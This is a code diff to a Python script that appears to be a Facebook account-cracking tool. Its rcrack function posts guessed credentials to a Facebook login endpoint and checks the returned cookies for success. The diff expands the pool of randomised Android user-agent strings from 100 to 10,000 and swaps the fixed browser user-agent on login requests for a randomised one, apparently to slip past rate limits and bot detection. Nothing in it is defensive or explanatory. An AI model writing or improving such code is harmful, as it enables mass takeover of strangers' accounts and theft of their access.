@@ -85,9 +85,9 @@ bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "0
 done = False
 
 ugen=[]
-for x in range(100):
+for x in range(10000):
     aa='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['6','7','8','9','10','11','12'])
+    b=random.choice(['10','11','12'])
     c=' en-us; GT-'
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
@@ -299,7 +299,7 @@ def rcrack(uid,pwx,tl):
 			'sec-fetch-mode': 'navigate',
 			'sec-fetch-site': 'same-origin',
 			'upgrade-insecure-requests': '1',
-			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
+			'user-agent': pro,}
 			lo = session.post('https://x.facebook.com/login/?ref=dbl&fl',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
